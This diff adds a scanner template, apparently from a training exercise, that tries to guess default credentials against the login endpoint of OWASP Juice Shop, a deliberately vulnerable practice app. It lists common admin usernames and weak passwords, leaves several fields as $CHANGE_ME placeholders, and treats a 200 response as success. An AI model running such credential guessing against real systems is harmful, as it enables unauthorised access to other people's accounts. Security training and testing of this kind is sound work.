@@ -1,0 +1,40 @@
+id: try-it-yourself-5-template
+info:
+  name: try-it-yourself-5-template
+  author: bounce
+  severity: high
+
+http:
+
+  - raw:
+      - |
+        POST /rest/user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+        Cookie: __Secure-balancer=$CHANGE_ME
+        
+        {"email":"$CHANGE_ME","password":"$CHANGE_ME"}
+
+    payloads:
+      username:
+        - admin
+        - root
+        - Administrator
+        - admin@juice-sh.op
+
+      password:
+        - admin
+        - guest
+        - password
+        - admin123
+        - test
+        - 12345
+        - 123456
+
+    attack: $CHANGE_ME
+
+    matchers:
+      - type: status
+        status:
+          - 200
+
